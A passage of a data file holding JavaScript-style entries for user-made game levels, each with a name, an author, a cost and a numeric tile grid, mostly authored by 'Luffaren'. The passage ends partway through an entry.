maps.push({name="strayfe jhyomp",author="stu",id="#1651740322",direction="forward",cost=169,elevation=0,map=[0,0,0,0,0,14,2,2,14,13,12,11,10,109,109,109,1,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,1,110,110,110,1,0,0,0,0,0,0,0,0,19,19,19,19,0,0,0,1,111,111,111,1,0,0,97,0,0,0,0,0,14,14,14,14,0,0,0,1,112,112,112,1,0,0,24,0,0,0,0,0,0,19,19,0,0,0,0,1,113,113,113,1,0,0,124,0,0,0,0,0,0,14,14,0,0,0,0,1,114,114,114,116,118,120,122,0,0,0,0,0,0,19,19,0,0,0,0,1,14,14,14,1,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,1,14,14,14,1,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,1,96,96,96,1,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,1,14,127,14,1,0,0,0,0,0,0,0,0,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,14,14,14,98,98,98,98,0,0,0,0,0,0,14,14,0,0,0,0,0,14,99,14,98,14,14,14,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,98,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,98,14,2,2]});
maps.push({name="A Cigarette",author="Tastysaw",id="#1651907432",direction="forward",cost=186,elevation=2,map=[0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,11,11,0,5,75,75,75,75,5,0,0,0,0,0,0,0,0,0,11,11,11,0,0,5,75,75,75,75,5,0,0,0,0,0,0,0,0,0,0,0,0,11,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,11,11,0,5,65,65,65,65,5,0,0,0,0,0,0,0,0,0,11,11,11,0,0,5,65,65,65,65,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,65,65,65,65,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,65,65,65,65,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,65,65,65,65,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,65,65,65,65,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,65,65,65,65,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,65,65,65,65,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,65,65,65,65,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,65,65,65,65,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,65,65,65,65,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,26,0,26,26,0,26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,27,27,27,27,27,27,0,0,0,0,0,0,0,0,0,0,0,0,0,0,28,28,2,2,28,28,0,0,0,0,0,0,0,0,0]});
maps.push({name="fraz ladder def",author="fraz",id="#1652131021",direction="right",cost=230,elevation=15,map=[5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,3,3,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,95,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,3,3,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,15,15,15,15,15,15,15,15,15,22,20,20,20,1,20,95,20,1,0,0,15,15,15,15,15,15,15,15,3,22,20,20,20,1,20,1,20,1,0,0,15,15,15,15,15,15,15,15,15,22,20,20,20,1,20,1,20,1,0,0,15,15,15,15,15,15,15,15,3,22,20,20,20,1,20,1,20,1,0,0,15,15,15,15,15,15,15,15,15,22,20,20,20,1,20,1,20,1,20,20,15,15,15,15,15,15,15,15,3,22,20,20,20,1,20,1,20,1,20,2,15,15,15,15,15,15,15,15,15,22,20,20,20,95,20,1,20,95,20,2,15,15,15,15,15,15,15,15,3,22,20,20,20,1,1,1,1,1,20,20]});
maps.push({name="JumpJump",author="Jando",id="#1652453864",direction="left",cost=103,elevation=-15,map=[0,0,0,0,0,0,0,0,0,0,0,101,24,0,2,2,0,0,0,0,0,0,127,16,0,0,0,0,0,0,0,128,101,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,101,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,0,0,0,0,0,0,0,0,9,0,0,0,0,0,0,19,19,24,19,19,19,0,0,0,0,0,0,9,9,9,0,0,0,0,0,95,95,0,0,0,0,0,0,0,0,0,0,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,0,0,0,14,0,0,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,0,21,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,102,0,0,0,0,0,0,0,0,2,95,95,9,9,9,0,0,0,101,101,101,0,0,0,0,0,0,0,0,2,95,95,9,9,9,9,0,0,101,101,101,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="defend tp and think",author="blasian",id="#1652493928",direction="forward",cost=218,elevation=0,map=[0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,14,14,14,14,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,90,14,90,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,91,90,91,90,91,0,0,0,0,0,0,0,0,0,0,0,0,9,0,14,14,14,14,14,14,0,0,0,1,1,1,1,1,0,0,0,0,92,0,14,14,14,14,14,14,0,0,0,1,30,30,30,1,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,30,0,14,14,1,1,1,1,90,14,14,0,30,30,30,0,9,0,0,0,0,0,14,14,96,91,91,91,90,14,14,0,0,0,0,0,92,0,0,0,30,0,14,14,96,14,14,90,14,14,14,0,30,30,30,0,0,0,0,0,0,0,14,14,96,14,90,14,14,14,14,0,0,0,0,0,0,0,0,0,0,96,96,96,96,91,91,91,90,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,1,1,1,1,90,14,14,0,0,0,0,0,9,0,0,0,0,0,14,14,0,0,0,0,0,14,14,0,0,0,9,9,99,97,9,9,9,92,14,93,0,0,0,0,98,98,98,98,0,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,92,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,98,98,98,98,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0]});
maps.push({name="simple",author="blasian",id="#1652495248",direction="right",cost=125,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,19,19,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,92,0,19,19,0,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,92,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,97,16,0,92,16,16,92,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,19,19,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,98,19,19,19,19,19,2,0,0,0,0,0,0,0,0,19,19,19,19,19,98,19,19,19,19,19,2,0,0,0,0,0,0,0,0,0,0,0,92,1,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,96,96,0,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,96,0,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,96,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,99,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Headquarters",author="Luffaren",id="#1652698615",direction="left",cost=370,elevation=-9,map=[1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,2,10,11,12,13,99,14,14,1,119,119,119,119,119,119,119,90,1,93,19,2,10,11,12,13,14,14,14,1,119,1,119,119,119,119,1,119,1,97,131,10,10,11,12,13,14,14,0,1,119,119,18,18,18,18,119,119,1,19,19,0,0,0,0,0,0,0,0,1,90,119,18,18,18,18,119,119,1,0,0,0,0,0,0,0,0,0,0,1,119,1,18,65,65,18,1,119,1,18,0,0,0,33,33,0,0,0,0,1,119,18,18,65,65,18,18,119,1,0,0,1,1,98,98,1,1,67,0,1,119,18,18,65,65,18,18,119,1,17,0,1,113,113,113,113,1,67,0,1,119,1,18,65,65,18,1,119,1,0,0,1,113,114,114,114,114,0,0,1,119,119,18,18,18,18,119,119,1,16,0,1,113,114,90,114,114,0,0,1,90,119,18,18,18,18,119,90,1,0,0,1,113,114,114,90,1,0,0,1,119,1,119,119,119,119,1,119,1,15,0,1,1,114,114,1,1,0,0,1,119,119,119,119,119,119,119,119,1,0,0,0,0,0,0,0,0,0,92,1,98,119,118,118,118,118,1,1,1,35,0,0,67,0,0,0,36,35,34,94,34,1,117,117,117,117,1,0,0,0,0,1,1,114,114,1,1,1,1,1,1,1,116,116,116,116,1,35,0,0,0,1,90,114,114,114,114,114,90,114,96,114,115,115,115,115,1,0,0,0,0,1,90,114,114,114,114,114,114,114,96,114,115,115,115,115,115,0,0,0,0,1,114,114,90,114,90,114,114,114,96,114,132,115,90,115,1,67,0,0,0,1,1,114,114,1,1,114,114,1,1,1,1,1,1,1,1,67,0,0,0]});
maps.push({name="Skater snake",author="Luffaren",id="#1652700886",direction="forward",cost=500,elevation=-5,map=[0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,2,2,0,0,14,14,1,1,1,1,1,1,1,1,1,1,1,1,1,1,127,127,0,14,14,1,1,135,135,135,1,1,0,0,0,0,0,0,1,135,135,135,0,14,1,1,135,135,135,135,135,1,1,0,0,0,0,0,1,135,135,135,135,14,1,135,135,135,135,135,135,135,1,1,0,0,0,0,1,135,135,135,135,14,1,135,135,135,135,135,135,135,135,1,0,0,0,0,1,135,135,135,135,14,1,135,135,135,135,135,135,135,135,1,1,0,0,0,1,1,135,135,135,14,1,135,135,135,1,1,135,135,135,135,1,0,0,0,0,1,135,135,135,14,1,135,135,1,1,1,135,135,135,135,1,0,0,0,0,1,135,135,135,14,1,135,135,1,0,1,135,135,135,1,1,0,0,0,0,1,135,135,135,14,1,135,135,1,0,1,135,135,135,1,0,0,0,0,1,1,135,135,135,14,1,135,135,1,0,1,135,135,1,1,0,0,0,0,1,135,135,135,135,14,1,135,135,1,0,1,135,135,1,0,0,0,0,0,1,135,135,135,135,14,1,135,135,1,1,1,135,135,1,1,0,0,0,1,1,135,135,135,135,14,1,14,14,1,1,135,135,135,135,1,1,1,1,1,135,135,135,135,135,14,1,16,16,1,1,135,135,135,135,135,135,135,135,135,135,135,135,135,135,14,1,16,16,1,1,1,135,135,135,135,135,135,135,135,135,135,135,135,0,16,16,16,16,1,0,1,135,135,135,135,135,135,135,135,135,135,135,135,0,9,9,9,3,1,0,0,1,1,135,135,135,135,135,135,135,135,135,0,0,9,2,2,9,1,0,0,0,1,1,1,135,135,135,135,135,0,0,0,0]});
maps.push({name="Crossings",author="Luffaren",id="#1652703993",direction="left",cost=339,elevation=-10,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,2,2,19,67,0,0,1,1,1,1,1,19,0,0,0,0,0,0,0,19,19,19,19,67,0,0,1,124,24,100,24,19,92,0,0,0,0,0,0,19,19,19,19,67,0,0,1,124,24,24,24,19,92,0,0,0,0,0,0,19,19,19,19,67,0,0,1,123,1,24,24,19,92,0,0,0,0,0,0,19,19,19,19,67,0,0,1,122,1,19,19,19,92,0,0,0,0,0,0,19,19,19,19,67,0,0,1,121,1,97,19,19,92,0,0,0,0,0,0,19,19,19,19,67,0,0,1,120,1,1,19,19,0,0,0,0,0,0,0,19,19,19,19,67,0,0,1,119,119,1,19,67,0,0,0,0,0,0,0,19,19,19,19,67,0,0,1,119,119,1,19,0,0,0,0,0,0,0,0,19,19,19,19,67,0,9,9,9,10,11,12,13,14,14,14,15,16,17,18,19,19,19,19,67,0,2,9,9,10,11,12,13,14,14,14,15,16,17,18,19,19,19,19,67,0,2,9,9,10,11,12,13,14,14,14,15,16,17,18,19,19,19,19,67,0,9,9,9,10,11,12,13,14,14,14,15,16,17,18,19,19,19,19,67,0,1,1,0,0,1,1,0,0,0,0,0,0,0,1,1,119,119,1,1,0,1,1,92,92,1,1,1,119,1,119,1,119,1,1,119,119,119,119,1,0,1,119,19,19,119,96,119,119,119,119,119,119,119,119,119,19,19,119,119,0,1,119,19,19,119,96,119,119,119,119,119,119,119,119,119,19,19,119,119,0,1,119,119,119,119,1,1,1,1,1,1,1,1,1,119,119,119,119,1,0,1,1,119,119,1,1,0,0,0,0,0,0,0,1,1,119,119,1,1,0]});
maps.push({name="Leap and catch",author="Luffaren",id="#1652704443",direction="forward",cost=362,elevation=-19,map=[0,0,0,0,0,0,0,24,2,2,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,135,135,135,135,135,135,0,0,0,0,0,0,0,0,0,0,0,135,135,135,135,135,135,135,135,135,135,0,0,0,0,0,0,0,0,0,0,135,135,135,135,135,135,135,135,135,135,0,0,0,0,0,0,0,0,0,135,135,135,135,135,135,135,135,135,135,135,135,0,0,0,0,0,0,0,0,135,135,135,135,135,135,135,135,135,135,135,135,0,0,0,0,0,0,0,0,135,135,135,135,135,135,135,135,135,135,135,135,0,0,0,0,0,0,0,0,135,135,135,135,135,135,135,135,135,135,135,135,0,0,0,0,0,0,0,0,135,135,135,135,135,135,135,135,135,135,135,135,0,0,0,0,0,0,0,0,135,135,135,135,135,135,135,135,135,135,135,135,0,0,0,0,0,0,0,0,135,135,135,135,135,135,135,135,135,135,135,135,0,0,0,0,0,0,0,0,135,135,135,135,135,135,135,135,135,135,135,135,0,0,0,0,0,0,0,0,135,135,135,135,135,135,135,135,135,135,135,135,0,0,0,0,0,0,0,0,135,135,135,135,135,5,5,135,135,135,135,135,0,0,0,0,0,0,0,0,135,135,135,135,5,5,5,5,135,135,135,135,0,0,0,0,0,0,0,0,135,135,135,135,5,5,5,5,135,135,135,135,0,0,0,0,0,0,0,0,5,5,5,5,5,2,2,5,5,5,5,5,0,0,0,0,0]});
maps.push({name="Funky flight",author="Luffaren",id="#1652705541",direction="forward",cost=323,elevation=-10,map=[1,2,2,1,1,1,1,1,1,1,90,19,19,19,19,19,90,19,19,90,1,24,24,3,19,19,90,19,19,19,19,19,90,19,19,19,19,19,19,19,1,14,24,3,19,1,1,1,1,1,1,1,1,1,1,1,1,1,90,19,1,127,1,1,1,1,67,0,129,67,67,0,118,0,67,127,0,1,19,90,1,0,1,0,0,1,67,0,0,0,0,0,1,0,0,0,0,1,19,19,1,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,1,19,19,1,0,0,0,0,1,0,0,0,0,0,1,1,0,0,0,0,1,90,19,1,67,0,0,0,1,67,0,0,0,0,1,0,0,0,0,0,1,19,19,1,67,0,0,0,1,67,0,0,0,0,1,0,0,0,0,0,1,19,90,1,0,0,0,0,1,67,0,0,0,0,1,0,0,0,0,0,1,19,19,1,127,0,0,0,1,67,0,126,0,0,1,0,0,0,127,0,1,90,19,1,0,0,0,0,1,67,0,0,0,0,1,0,0,0,0,0,1,90,19,1,0,0,0,0,1,67,0,0,0,0,1,67,0,0,0,0,1,19,90,1,0,0,0,67,1,1,1,118,1,1,1,67,0,0,0,0,1,19,19,1,0,0,0,67,1,67,67,67,67,0,1,67,0,0,0,0,1,19,19,1,0,0,0,67,1,0,0,0,0,67,1,0,0,0,0,0,1,19,90,1,0,0,0,0,1,0,0,0,0,67,1,0,0,0,67,67,1,19,19,1,129,0,0,0,0,0,0,126,0,67,1,0,90,14,14,14,90,3,1,1,0,0,0,0,0,0,0,0,0,67,1,0,14,90,14,14,90,14,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1]});
maps.push({name="Gravity strafe",author="Luffaren",id="#1652707111",direction="forward",cost=282,elevation=-10,map=[0,0,0,0,24,2,2,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,24,24,85,24,24,24,24,24,24,85,24,24,24,24,24,0,0,0,0,24,24,24,24,24,24,24,24,24,24,24,24,24,24,89,24,0,0,0,0,24,24,24,24,24,90,24,24,85,24,24,90,24,24,24,24,0,0,0,1,124,124,1,1,1,1,1,1,1,1,1,1,1,23,23,23,0,0,0,1,90,124,1,24,85,24,85,130,130,130,130,130,1,22,22,22,0,0,0,1,124,124,1,85,0,0,24,130,130,130,130,130,1,21,21,21,0,0,0,1,124,90,1,24,0,1,1,1,1,1,130,130,1,20,20,20,0,0,0,1,90,124,1,85,0,1,0,0,0,1,130,130,1,19,19,19,0,0,0,1,90,124,24,85,0,1,1,1,1,1,130,130,1,18,18,18,0,0,0,1,124,124,24,0,0,1,1,19,19,130,130,130,1,17,17,17,0,0,0,1,1,1,1,1,1,1,1,19,19,130,130,130,1,16,16,16,0,0,0,0,0,0,0,0,0,0,1,119,119,1,1,1,1,15,15,15,0,0,0,0,0,0,0,0,0,0,1,90,19,93,19,1,90,14,14,14,0,0,0,0,0,0,0,0,0,0,1,19,19,19,90,119,14,14,14,85,0,0,0,0,0,0,0,0,0,0,1,19,100,19,19,119,14,14,14,14,0,0,0,0,0,0,0,0,0,0,1,90,90,19,94,1,90,14,14,14,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,14,2,2,14,0,0]});
maps.push({name="Moist sanctuary",author="Luffaren",id="#1652708799",direction="forward",cost=700,elevation=0,map=[0,0,0,0,0,67,67,67,14,2,2,14,67,67,67,0,0,0,0,0,0,0,0,67,67,65,65,65,14,14,14,14,65,65,65,67,67,0,0,0,0,0,67,65,65,65,65,65,65,65,65,65,65,65,65,65,65,67,0,0,0,67,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,67,0,0,67,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,67,0,67,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,67,67,65,65,65,65,65,65,65,65,14,14,65,65,65,65,65,65,65,65,67,67,65,65,65,65,65,65,65,14,14,14,14,65,65,65,65,65,65,65,67,67,65,65,65,65,65,65,14,1,115,115,1,14,65,65,65,65,65,65,67,67,65,65,65,65,65,14,14,115,116,116,115,14,14,65,65,65,65,65,67,67,65,65,65,65,65,14,14,115,116,116,115,14,14,65,65,65,65,65,67,67,65,65,65,65,65,65,14,1,115,115,1,14,65,65,65,65,65,65,67,67,65,65,65,65,65,65,65,14,14,14,14,65,65,65,65,65,65,65,67,67,65,65,65,65,65,65,65,65,14,14,65,65,65,65,65,65,65,65,67,67,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,67,0,67,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,67,0,0,67,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,67,0,0,0,67,65,65,65,65,65,65,65,65,65,65,65,65,65,65,67,0,0,0,0,0,67,67,65,65,65,14,14,14,14,65,65,65,67,67,0,0,0,0,0,0,0,0,67,67,67,14,2,2,14,67,67,67,0,0,0,0,0]});
maps.push({name="Fly you fools",author="Luffaren",id="#1652711020",direction="left",cost=201,elevation=5,map=[0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,119,119,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,90,19,19,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,20,19,19,90,1,1,0,0,0,0,0,1,1,0,0,0,0,0,0,1,130,90,19,19,20,1,1,0,0,0,0,0,1,1,1,0,0,0,1,1,130,0,19,39,130,0,1,1,0,0,0,0,0,0,1,1,1,1,1,0,130,0,39,0,130,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,130,0,39,0,130,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,130,0,39,0,130,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,39,0,130,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,39,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,0,0,0,0,39,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,19,20,1,19,19,39,0,0,0,1,1,1,0,0,0,0,0,0,0,1,1,19,19,90,19,19,19,20,1,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,95,1,1,1,0,0,0,0,0,1,1,1,1,1,1,1,1,0,1,1,119,90,1,0,0,0,0,0,1,1,90,124,124,124,90,123,1,1,1,90,119,119,1,0,0,0,0,0,2,124,24,90,24,90,124,123,122,121,120,119,119,90,1,0,0,0,0,0,2,124,124,24,124,24,124,123,122,121,120,119,119,1,1,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0]});
maps.push({name="Pyramid halfling",author="Luffaren",id="#1652711672",direction="forward",cost=400,elevation=0,map=[0,67,67,0,0,0,0,0,14,2,2,14,0,0,0,67,67,67,67,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,67,0,14,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,14,67,0,14,15,16,16,16,16,16,16,16,16,16,16,16,16,16,16,15,14,67,67,14,15,16,17,17,17,17,17,17,17,17,17,17,17,17,16,15,14,0,67,14,15,16,17,18,18,18,18,18,18,18,18,18,18,17,16,15,14,0,0,14,15,16,17,18,19,19,19,19,19,19,19,19,18,17,16,15,14,0,0,14,15,16,17,18,19,9,9,9,9,4,9,19,18,17,16,15,14,0,0,14,15,16,17,18,19,4,7,7,7,7,9,19,18,17,16,15,14,0,0,14,15,16,17,18,19,9,7,5,93,7,9,19,18,17,16,15,14,0,0,14,15,16,17,18,19,94,7,100,5,7,9,19,18,17,16,15,14,0,0,14,15,16,17,18,19,9,7,7,7,7,4,19,18,17,16,15,14,0,0,14,15,16,17,18,19,9,4,9,9,89,9,19,18,17,16,15,14,67,0,14,15,16,17,18,19,19,19,19,19,19,19,19,18,17,16,15,14,67,0,14,15,16,17,18,18,18,18,18,18,18,18,18,18,17,16,15,14,67,0,14,15,16,17,17,17,17,17,17,17,17,17,17,17,17,16,15,14,67,0,14,15,16,16,16,16,16,16,16,16,16,16,16,16,16,16,15,14,67,0,14,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,14,67,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,67,67,67,0,0,67,14,2,2,14,0,0,0,0,0,0,0,0]});
maps.push({name="Dark Fantasy",author="Luffaren",id="#1652783362",direction="forward",cost=171,elevation=5,map=[0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,105,105,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,88,105,105,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,105,105,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,106,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,107,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,108,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,109,1,1,1,1,1,0,0,0,0,0,0,0,0,1,10,10,10,10,10,10,10,10,10,10,1,0,0,0,0,0,0,0,0,1,10,10,10,10,10,10,10,10,10,10,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,10,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0,3,0,1,96,10,96,1,3,0,1,0,0,0,0,0,0,0,0,1,1,119,1,1,0,96,0,1,0,0,1,0,0,0,0,0,0,0,0,1,3,0,0,1,0,10,0,1,0,0,1,0,0,0,0,0,0,0,0,1,105,1,1,1,0,10,0,1,0,3,1,0,0,0,0,0,0,0,0,1,0,0,0,1,0,10,0,1,0,0,1,0,0,0,0,0,0,0,0,1,0,3,10,1,0,10,0,1,10,0,1,0,0,0,0,0,0,0,0,1,97,1,1,1,0,10,0,1,1,97,1,0,0,0,0,0,0,0,0,1,10,96,10,10,10,10,10,10,96,10,1,0,0,0,0,0,0,0,0,1,1,1,1,1,2,2,1,1,1,1,1,0,0,0,0,0]});
maps.push({name="Danger detour",author="Luffaren",id="#1652785039",direction="right",cost=453,elevation=-10,map=[0,0,1,1,1,24,2,2,24,1,1,1,0,0,0,0,0,0,0,0,0,0,1,1,24,24,24,24,24,24,1,1,5,90,5,5,0,0,0,0,0,24,24,24,24,24,24,24,24,24,90,5,5,5,5,5,5,0,0,0,24,24,24,24,24,24,24,24,24,3,5,5,5,5,5,5,5,5,0,0,24,24,24,24,5,5,24,24,5,5,5,5,5,5,5,5,5,5,5,0,23,23,23,5,5,5,5,90,5,5,5,5,5,89,5,5,5,5,5,5,22,22,22,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,20,20,20,5,5,5,5,5,5,5,5,5,5,5,5,5,5,84,84,77,20,20,20,5,5,5,5,5,5,5,84,84,84,84,84,84,84,84,84,77,75,75,77,84,84,84,82,5,5,84,84,81,5,5,84,84,84,84,84,77,17,75,77,84,84,84,84,84,84,84,81,5,5,5,5,5,5,5,5,5,17,17,17,5,5,5,5,5,82,5,5,5,5,5,5,5,5,5,90,5,14,14,14,5,5,5,5,5,84,82,5,5,5,5,5,5,5,4,14,14,14,14,14,5,5,5,5,5,5,82,5,5,5,5,5,5,4,14,14,2,14,14,14,14,5,5,90,5,5,82,5,5,90,5,5,4,14,14,14,2,14,14,14,14,14,14,14,14,5,82,5,14,14,14,14,14,14,14,14,14,0,14,14,14,14,89,14,14,14,82,14,14,89,14,14,90,14,14,14,1,0,0,14,90,14,14,14,14,14,82,14,14,14,14,90,14,14,90,1,1,0,0,0,0,0,0,0,0,0,77,0,0,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Above and beyond",author="Luffaren",id="#1652796980",direction="right",cost=387,elevation=0,map=[67,67,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,21,21,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,5,21,21,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,85,21,21,21,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,5,21,21,21,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,5,5,22,22,22,1,1,124,130,0,0,3,0,0,3,67,65,109,1,1,96,96,23,23,23,1,124,124,0,0,0,0,0,0,0,0,67,109,97,1,96,96,24,24,24,1,124,124,0,0,0,0,0,0,0,0,0,109,109,1,5,5,85,24,24,1,124,24,24,0,0,0,67,67,0,0,0,9,109,1,5,5,24,85,24,95,124,24,24,24,0,67,1,1,67,0,9,9,109,96,9,5,24,24,24,95,124,24,24,24,0,67,1,1,67,0,9,9,109,96,9,5,85,24,85,1,124,24,24,0,0,0,67,67,0,0,0,9,109,1,